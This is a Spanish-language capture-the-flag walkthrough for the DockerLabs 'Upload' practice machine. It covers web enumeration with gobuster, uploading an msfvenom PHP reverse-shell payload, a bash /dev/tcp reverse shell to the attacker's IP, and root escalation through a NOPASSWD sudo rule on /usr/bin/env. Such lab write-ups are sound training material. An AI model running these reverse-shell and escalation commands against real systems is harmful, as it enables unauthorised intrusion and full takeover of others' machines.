Lo primero que tenemos que hacer, es ir a la pagina de "dockerlabs.es" y bajarnos la maquina "Upload".
Una vez hecho y COMO SIEMPRE, descomprimimos el archivo, e inicializamos la maquina con el comando:
```
sudo bash auto_deploy.sh upload.tar
```
Tras desplegarse la maquina, hacemos un NMAP. No necesitamos hacer un ARP-SCAN (o NETDISCOVER), porque ya sabemos la IP de la maquina victima.
```
Discovered open port 80/tcp on 172.17.0.2
```
Vemos que solo tiene abierto el puerto 80, por lo que probaremos a poner la IP en nuestro navegador y vemos que nos sale una pagina que nos permite subir un archivo.
Por si acaso, hacemos un "CTRL + U" pero no se observa nada "especial" en el codigo.
Entonces, vamos a empezar haciendo un poco de FUZZNG WEB para ver si encontramos algun directorio o subdominio al que poder acceder.
Para ello usaremos "gobuster" mediante el comando:
```
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x .php,.html,.py
```
y tras esperar un poco, obtenemos lo siguiente:
```
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                (Status: 403) [Size: 275]
/.html               (Status: 403) [Size: 275]
/index.html          (Status: 200) [Size: 1361]
/uploads             (Status: 301) [Size: 310] [--> http://172.17.0.2/uploads/]
/upload.php          (Status: 200) [Size: 1357]
/.html               (Status: 403) [Size: 275]
/.php                (Status: 403) [Size: 275]
/server-status       (Status: 403) [Size: 275]
Progress: 830572 / 830576 (100.00%)
===============================================================
Finished
===============================================================
```
Vemos claramente un directorio llamado "/uploads" por lo que sera el momento de subir algun archivo en ".php" e ir a ese directorio para ver si podemos ganar acceso ejecutando dicho archivo.
Para ello, vamos a utilizar "msfvenom" de la siguiente forma:
```
msfvenom -p php/reverse_php LHOST=172.17.0.1 LPORT=443 -f raw > subida.php
```
Una vez creado, volvemos a la pagina del principio y subimos este archivo, obteniendo:
```
The file subida.php has been uploaded.
```
Bien, ahora que el archivo se ha subido bien, es hora de ir al directorio "/uploads" que hemos encontrado con "gobuster".

![[subida.png#center|360]]
Es momento ahora de abrir "netcat" por el puerto 443, que es el que hemos configurado en el payload hecho con "msfvenom":
```
nc -nlvp 443
```
Ahora tenemos que ejecutar el archivo "subida.php" y veremos mediante "netcat" que ya tenemos acceso a la maquina.
```
listening on [any] 443 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 59820
whoami
www-data
```
Sin embargo, conviene estabilizar la conexion debido a que los payloads en ".php" con "msfvenom" no suelen ser muy estables.
Para ello, abrimos la pagina "https://www.revshells.com/" y poniendo nuestra IP y el puerto por el que queramos escuchar luego con "netcat" nos dara una reverse. En este caso:
```
sh -i >& /dev/tcp/172.17.0.1/444 0>&1
```
Ahora debemos hacer dos cositas:
	1) Abrir otra terminal y poner "netcat" a la escucha por el puerto 444  (elegido)
	2) Escribir en la primera terminal, el comando:
		```bash -c "sh -i >& /dev/tcp/172.17.0.1/444 0>&1"```
		Lo que nos dara la reverse por el puerto 444 y que recibiremos en la segunda terminal.
![[reverse.png]]
Ahora ya podriamos cerrar la primera terminal y pasarnos a la segunda, ya que acabamos de estabilizar la conexion. Ahora, por supuesto, lo primero que haremos sera el tratamiento de la TTY. Para ello, seguimos estos pequeños pasos:
```
1) Escribimos:
	script /dev/null -c bash
2) Ahora pulsamos (CTRL + Z) y nos devuele a la terminal de la maquina atacante
3) Escribimos:
	stty raw -echo; fg
4) Una vez escrito lo anterior y vuelto a la maquina victima, escribimos:
	reset xterm
5) Finalmente, escribimos estos dos comandos:                    
    export TERM=xterm
    export SHELL=bash
6) Nos quedaria la terminal de la siguiente forma:
	www-data@fe0fc8e5b46b:/var/www/html/uploads$
```
Bien, con estos pequeños pasos ya hemos hecho el tratamiento de la TTY completo. Ahora tendriamos que intentar hacer la escalada de privilegios. Para ello, escribiremos "sudo -l" para ver si se pueden escalar privilegios de la forma mas sencilla, y obtenemos:
```
Matching Defaults entries for www-data on fe0fc8e5b46b:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User www-data may run the following commands on fe0fc8e5b46b:
    (root) NOPASSWD: /usr/bin/env
```
Como se puede observar en la ultima linea, podriamos ejecutar el binario "/env" sin credenciales.
Para ello buscamos en "https://gtfobins.github.io/gtfobins/env/#sudo" y vemos que nos dice que para obtener la reverse, tendriamos que escribir el comando "sudo env /bin/sh":
```
www-data@fe0fc8e5b46b:/var/www/html/uploads$ sudo env /bin/sh
# whoami
root
#
```
Tras escribirlo, vemos que somos ya root. Si quisieramos un prompt algo mas "normal", podriamos escribir el comando "bash -p", como se puede ver a continuacion:
```
# bash -p
root@fe0fc8e5b46b:/var/www/html/uploads# whoami
root
root@fe0fc8e5b46b:/var/www/html/uploads#
```

**NOTA: En caso de no querer ir, siempre que vayamos a hacer una escalada de privilegios, a la pagina "gtfobins.github.io", es recomendable instalarse "searchbins".
Una vez instalado, solo tendriamos que escribir:**
```
searchbins -b env -f sudo

	-b = nombre del binario
	-f = funcion del binario que buscamos (shell, sudo, suid, capabilities...)
```
